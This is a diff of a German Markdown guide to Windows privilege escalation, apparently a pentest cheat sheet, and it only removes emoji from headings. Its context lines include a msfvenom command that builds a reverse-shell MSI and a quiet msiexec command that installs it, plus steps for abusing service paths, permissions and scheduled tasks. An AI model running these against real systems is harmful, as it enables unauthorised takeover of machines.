@@ -63,7 +63,7 @@ Identifiziert potenzielle Schwachstellen wie Dienste mit schwachen ACLs, ungesic
 
 ## Typische Escalation-Vektoren
 
-### 🔹 1. Unquoted Service Paths
+### 1. Unquoted Service Paths
 
 Nicht in Anführungszeichen gesetzte Pfade in Diensten:
 
@@ -73,7 +73,7 @@ sc qc <ServiceName>
 
 Pfad zu ausführbarer Datei enthält Leerzeichen → eigene Binärdatei einschleusen.
 
-### 🔹 2. Schwache Dienstrechte (Insecure Permissions)
+### 2. Schwache Dienstrechte (Insecure Permissions)
 
 Benutzer hat Schreibrechte auf den Dienst:
 
@@ -83,7 +83,7 @@ accesschk.exe -uws Benutzer *
 
 → Dienstdatei oder Binärpfad ersetzen.
 
-### 🔹 3. Scheduled Tasks mit schwachen Rechten
+### 3. Scheduled Tasks mit schwachen Rechten
 
 ```bash
 taskschd.msc
@@ -92,7 +92,7 @@ schtasks /query /fo LIST /v
 
 → Aufgabe manipulieren oder durch Trojaner ersetzen.
 
-### 🔹 4. AlwaysInstallElevated (MSI-Bypass)
+### 4. AlwaysInstallElevated (MSI-Bypass)
 
 ```bash
 reg query HKCU\Software\Policies\Microsoft\Windows\Installer
@@ -118,7 +118,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f msi > shell.msi
 msiexec /quiet /qn /i shell.msi
 ```
 
-### 🔹 5. DLL Hijacking
+### 5. DLL Hijacking
 
 Wenn ein ausführbares Programm DLLs aus unsicheren Pfaden lädt:
 
@@ -127,7 +127,7 @@ Wenn ein ausführbares Programm DLLs aus unsicheren Pfaden lädt:
 
 Tools zur Analyse: [Procmon.exe](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)
 
-### 🔹 6. UAC-Bypass (User Access Control)
+### 6. UAC-Bypass (User Access Control)
 
 Identifiziere UAC-schwache Prozesse:
 
